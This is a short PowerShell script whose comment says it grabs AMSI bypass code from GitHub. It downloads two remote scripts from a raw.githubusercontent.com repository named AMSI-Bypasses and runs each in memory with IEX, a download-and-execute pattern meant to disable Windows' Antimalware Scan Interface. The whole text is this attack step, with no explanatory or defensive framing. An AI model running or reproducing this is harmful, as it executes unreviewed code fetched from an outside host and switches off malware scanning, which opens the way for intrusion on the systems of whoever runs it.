
#grab the AMSI bypass code from github
$block1 = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/amsiinitfail-dc1.ps1")
$block2 = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/amsiinitfail-dc2.ps1")

IEX $block1
IEX $block2
